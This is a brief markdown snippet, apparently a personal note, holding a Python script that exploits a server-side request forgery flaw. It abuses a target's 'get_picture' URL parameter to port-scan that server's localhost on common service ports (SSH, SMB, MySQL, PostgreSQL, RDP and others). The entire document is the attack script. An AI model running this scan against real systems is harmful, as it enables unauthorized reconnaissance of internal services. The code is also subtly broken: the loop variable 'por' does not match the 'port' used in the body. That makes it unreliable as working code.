# SSRF portscan

```python
import requests


portas = {21,22,23,25,139,445,443,80,8000,3306,5432,8080,8888,8443,3389}

for por in portas:
        print("Testando porta ["+str(port)+"]:")
        r = requests.get("http://host/?get_picture=http://localhost:"+str(port))
        print(r.status_code)
```
